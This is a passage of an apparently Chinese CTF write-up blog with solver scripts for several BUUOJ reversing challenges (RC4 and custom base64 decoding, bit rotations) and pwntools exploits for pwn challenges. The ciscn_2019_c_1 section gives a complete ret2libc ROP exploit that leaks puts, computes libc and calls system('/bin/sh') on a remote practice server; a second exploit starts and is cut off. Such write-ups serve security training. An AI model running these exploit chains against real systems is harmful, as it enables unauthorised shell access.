class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">a = [<span class="number">0xd9</span>, <span class="number">0x2c</span>, <span class="number">0x27</span>, <span class="number">0xd6</span>, <span class="number">0xd8</span>, <span class="number">0x2a</span>, <span class="number">0xda</span>, <span class="number">0x2d</span>, <span class="number">0xd7</span>, <span class="number">0x2c</span>, <span class="number">0xdc</span>, <span class="number">0xe1</span>, <span class="number">0xdb</span>, <span class="number">0x2c</span>, <span class="number">0xd9</span>, <span class="number">0xdd</span>, <span class="number">0x27</span>, <span class="number">0x2d</span>, <span class="number">0x2a</span>, <span class="number">0xdc</span>, <span class="number">0xdb</span>, <span class="number">0x2c</span>, <span class="number">0xe1</span>, <span class="number">0x29</span>, <span class="number">0xda</span>, <span class="number">0xda</span>, <span class="number">0x2c</span>, <span class="number">0xda</span>, <span class="number">0x2a</span>, <span class="number">0xd9</span>, <span class="number">0x29</span>, <span class="number">0x2a</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ls = f.readlines()[::<span class="number">-1</span>]</span><br><span class="line">    print(len(ls))</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> ls:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line:<span class="keyword">break</span></span><br><span class="line">       <span class="keyword">if</span> line[<span class="number">0</span>]==<span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">                a[i]|=<span class="number">0x100</span></span><br><span class="line">                a[i]=~a[i]</span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&#x27;^=&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> len(line)&gt;<span class="number">4</span> <span class="keyword">and</span> line[<span class="number">2</span>:<span class="number">4</span>]==<span class="string">&#x27;0x&#x27;</span>:</span><br><span class="line">                num = line[<span class="number">4</span>:<span class="number">-1</span>]</span><br><span class="line">                num = int(num,<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                num = line[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">                num = int(num,<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">                a[i]^=num</span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&#x27;++&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">                a[i]+=<span class="number">0x100</span></span><br><span class="line">                a[i]-=<span class="number">1</span></span><br><span class="line">                a[i]&amp;=<span class="number">0xFF</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&#x27;+=&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> len(line)&gt;<span class="number">4</span> <span class="keyword">and</span> line[<span class="number">2</span>:<span class="number">4</span>]==<span class="string">&#x27;0x&#x27;</span>:</span><br><span class="line">                num = line[<span class="number">4</span>:<span class="number">-1</span>]</span><br><span class="line">                num = int(num,<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                num = line[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">                num = int(num,<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">                a[i]+=<span class="number">0x100</span></span><br><span class="line">                a[i]-=num</span><br><span class="line">                a[i]&amp;=<span class="number">0xFF</span></span><br><span class="line">    print(bytes(a))</span><br></pre></td></tr></table></figure>

也可以使用IDAPython处理，也可以angr符号执行= =

## [rev][GUET-CTF2019]encrypt

1. rc4加密

2. 类base64加密，只不过是加上61

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">tab = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">res =[ord(i)<span class="number">-61</span> <span class="keyword">for</span> i <span class="keyword">in</span>  <span class="string">r&#x27;Z`TzzTrD|fQP[_VVL|yneURyUmFklVJgLasJroZpHRxIUlH\vZE=&#x27;</span>]</span><br><span class="line">c = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">    c+=tab[res[i]]</span><br><span class="line">c = c[:<span class="number">-1</span>]+<span class="string">&#x27;=&#x27;</span></span><br><span class="line">c = bytes(c,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">print(c)</span><br><span class="line">c = base64.b64decode(c)</span><br><span class="line">print(c)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    print(hex(i),end=<span class="string">&quot;,&quot;</span>)</span><br><span class="line">print()</span><br><span class="line">key = [<span class="number">16</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">48</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">16</span>,<span class="number">64</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">uint8_t</span>* data, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==============%s========&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(i % <span class="number">16</span>))<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n================================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span> <span class="comment">//初始化函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i =<span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++) &#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span> <span class="comment">//加解密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++) &#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">     &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> sbox[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> key[] = &#123;<span class="number">16</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">48</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">16</span>,<span class="number">64</span>&#125;;</span><br><span class="line">    rc4_init(sbox,key,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> data[] = &#123;<span class="number">0x76</span>,<span class="number">0x35</span>,<span class="number">0xfd</span>,<span class="number">0xf5</span>,<span class="number">0x7d</span>,<span class="number">0x47</span>,<span class="number">0xfe</span>,<span class="number">0x95</span>,<span class="number">0x13</span>,<span class="number">0x7a</span>,<span class="number">0x26</span>,<span class="number">0x59</span>,<span class="number">0x3f</span>,<span class="number">0xff</span>,<span class="number">0x31</span>,<span class="number">0xa1</span>,<span class="number">0x85</span>,<span class="number">0x7c</span>,<span class="number">0x63</span>,<span class="number">0x2</span>,<span class="number">0x6e</span>,<span class="number">0xbd</span>,<span class="number">0x93</span>,<span class="number">0x6a</span>,<span class="number">0x3e</span>,<span class="number">0x4d</span>,<span class="number">0x8d</span>,<span class="number">0xd7</span>,<span class="number">0x27</span>,<span class="number">0x73</span>,<span class="number">0x2d</span>,<span class="number">0x5e</span>,<span class="number">0xcc</span>,<span class="number">0x62</span>,<span class="number">0xf2</span>,<span class="number">0xdf</span>,<span class="number">0xe5</span>,<span class="number">0xd2</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    rc4_crypt(sbox,data,<span class="keyword">sizeof</span>(data)<span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

## [pwn]ciscn_2019_c_1

ROP

1. 使用puts函数打印puts的加载地址
2. 获取到puts的地址后，再次布置栈，达到系统调用

execve系统调用号为59，参数为execve(&quot;/bin/sh&quot;,0,0);

&quot;/bin/sh&quot;libc中有

elf.got[&#39;puts&#39;]内存放puts的地址，symbols是对应的函数的地址

使用dynELF查libc版本或LibcSearcher(我的查找到之后要选择第一个)

如果是Ubuntu18，需要一个ret才可以对齐

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span>(<span class="params">s</span>):</span></span><br><span class="line">    sa = [i <span class="keyword">for</span> i <span class="keyword">in</span> s]</span><br><span class="line">    cnt=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(sa)):</span><br><span class="line">        sa[i] = ord(sa[i])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> sa[i]&gt;=<span class="number">47</span> <span class="keyword">and</span> sa[i]&lt;=<span class="number">57</span>:</span><br><span class="line">            sa[i]^=<span class="number">0xF</span></span><br><span class="line">        <span class="keyword">elif</span> sa[i]&gt;=<span class="number">65</span> <span class="keyword">and</span> sa[i]&lt;=<span class="number">90</span>:</span><br><span class="line">            sa[i]^=<span class="number">0xE</span></span><br><span class="line">        <span class="keyword">elif</span> sa[i]&gt;=<span class="number">97</span> <span class="keyword">and</span> sa[i]&lt;=<span class="number">122</span>:</span><br><span class="line">            sa[i]^=<span class="number">0xD</span></span><br><span class="line">        <span class="keyword">elif</span> sa[i]==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(cnt):</span><br><span class="line">        res+=chr(sa[i])</span><br><span class="line">    res+=s[cnt:]</span><br><span class="line">    print(res)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./ciscn&#x27;)</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29787</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">use: first give it got addr of puts,then we can calcute address of system(), as </span></span><br><span class="line"><span class="string">well as &#x27;/bin/bash&#x27;, next give it an overflow and get shell via gadget.</span></span><br><span class="line"><span class="string">note that it does some change with character in [0-9a-zA-Z]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts = elf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">func_addr = <span class="number">0x4009A0</span></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x50</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(func_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:<span class="number">-1</span>]</span><br><span class="line">info(len(puts_addr))</span><br><span class="line">puts_addr = u64(puts_addr.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;puts_addr:0x%x&#x27;</span>%puts_addr)</span><br><span class="line">p.recv()</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">sys_addr = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;libc_base: 0x%x binsh: 0x%x sys_addr: 0x%x&#x27;</span>%(libc_base,binsh,sys_addr))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

## [rev] [MRCTF2020]EasyCpp

1. gdb加载基址指从相应段，如果实在找不到可以通过edb查看，或搜索内存中的特征串，然后通过偏移找到相关地址

2. 有几个lambda函数，可以点进去查看的

3. 输入9个数，存入vector

4. 第一个lambda函数把每一个数异或1

5. 第二个lambda找到每一个数的所有因数

6. 0换成O,1--&gt;l,2--&gt;z,3--&gt;E,4--&gt;A,5--&gt;s,6--&gt;G,7--&gt;T,8--&gt;B,9--&gt;q, (空格)--&gt;=

7. 最后提交的md5应该是大写，又不细心了= =

   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">   </span><br></pre></td></tr></table></figure>

#include &lt;inttypes.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;memory.h&gt;
#include &lt;string.h&gt;
#include &lt;math.h&gt;

void printArray(const char* name, uint8_t* data, size_t len) &#123;
    printf(&quot;==============%s========&quot;, name);
    for (size_t i = 0; i &lt; len; i++) &#123;
        if (!(i % 16))printf(&quot;\n&quot;);
        printf(&quot;0x%02x,&quot;, data[i]);
    &#125;
    printf(&quot;\n================================\n&quot;);
&#125;

int main() &#123;
    char s[][256] = &#123;&quot;=zqE=z=z=z&quot;,&quot;=lzzE&quot;,&quot;=ll=T=s=s=E&quot;,&quot;=zATT&quot;,&quot;=s=s=s=E=E=E&quot;,&quot;=EOll=E&quot;,&quot;=lE=T=E=E=E&quot;,&quot;=EsE=s=z&quot;,&quot;=AT=lE=ll&quot;&#125;;
    char tab[256];
    tab[&#39;=&#39;] = &#39; &#39;;
    tab[&#39;O&#39;]=0;
    tab[&#39;l&#39;]=1;
    tab[&#39;z&#39;]=2;
    tab[&#39;E&#39;]=3;
    tab[&#39;A&#39;]=4;
    tab[&#39;s&#39;]=5;
    tab[&#39;G&#39;]=6;
    tab[&#39;T&#39;]=7;
    tab[&#39;B&#39;]=8;
    tab[&#39;q&#39;]=9;

    uint32_t num[9]=&#123;0&#125;;
    for(size_t i=0;i&lt;9;i++)&#123;
        char *ss = s[i];
        num[i]=1;
        uint32_t t = 0;
        for(size_t j=1;j&lt;strlen(ss);j++)&#123;
            if(ss[j]==&#39;=&#39;)&#123;
                num[i]*=t;
                t=0;
            &#125;else&#123;
                t=t*10+tab[ss[j]];
            &#125;
        &#125;
        num[i]*=t;
        num[i]^=1;
    &#125;
    for(size_t i=0;i&lt;9;i++)&#123;
        printf(&quot;%d &quot;,num[i]);
    &#125;
    printf(&quot;\n&quot;);
    return 0;

&#125;

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">## [rev][QCTF2018]Xman-babymips</span><br><span class="line"></span><br><span class="line">1. ~~对counter做了个很复杂的变换最后只取前5个&#x3D; &#x3D;~~</span><br><span class="line">2. 这段代码</span><br><span class="line">     &#96;&#96;&#96;assembly</span><br><span class="line">    lw      \$v0, 0x48+counter($fp)</span><br><span class="line"></span><br><span class="line">    addiu   $v1, $fp, 0x48+counter</span><br><span class="line"></span><br><span class="line">    addu    $v0, $v1, $v0</span><br><span class="line"></span><br><span class="line">    lb      $v1, 4($v0)</span><br></pre></td></tr></table></figure>

    实际上是加载了第counter个输入

    off_input=off_counter+4

3. input[i]^=(i-0x20)
4. 奇数位循环右移2位，偶数位循环左移2位

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">a = [<span class="number">0x52</span>, <span class="number">0xfd</span>, <span class="number">0x16</span>, <span class="number">0xa4</span>, <span class="number">0x89</span>, <span class="number">0xbd</span>, <span class="number">0x92</span>, <span class="number">0x80</span>, <span class="number">0x13</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0xa0</span>, <span class="number">0x8d</span>, <span class="number">0x45</span>, <span class="number">0x18</span>, <span class="number">0x81</span>, <span class="number">0xde</span>, <span class="number">0xfc</span>, <span class="number">0x95</span>, <span class="number">0xf0</span>, <span class="number">0x16</span>, <span class="number">0x79</span>, <span class="number">0x1a</span>, <span class="number">0x15</span>, <span class="number">0x5b</span>, <span class="number">0x75</span>, <span class="number">0x1f</span>]</span><br><span class="line">start = <span class="string">&#x27;Q|j&#123;g&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    <span class="keyword">if</span> ((i)&amp;<span class="number">1</span>):</span><br><span class="line">        a[i]=a[i]&gt;&gt;<span class="number">2</span>|(a[i]&lt;&lt;<span class="number">6</span>)&amp;<span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a[i]=(a[i]&lt;&lt;<span class="number">2</span>)&amp;<span class="number">0xFF</span>|a[i]&gt;&gt;<span class="number">6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(start)):</span><br><span class="line">    a = [ord(start[<span class="number">4</span>-i])]+a</span><br><span class="line">print(a,len(a))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    a[i]^=(<span class="number">0x20</span>-i)</span><br><span class="line">print(a)</span><br><span class="line">print(bytes(a))</span><br></pre></td></tr></table></figure>

## [pwn][OGeek2019]babyrop

1. 程序产生随机数，读取用户输入，如果用户输入和随机数相等，则可以有exp

    呼，可以让buf=0，然后比对的字符数就是0，可以跳过认证

2. 构造ROP链，先泄露write地址以便找到libc_base，然后利用

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span 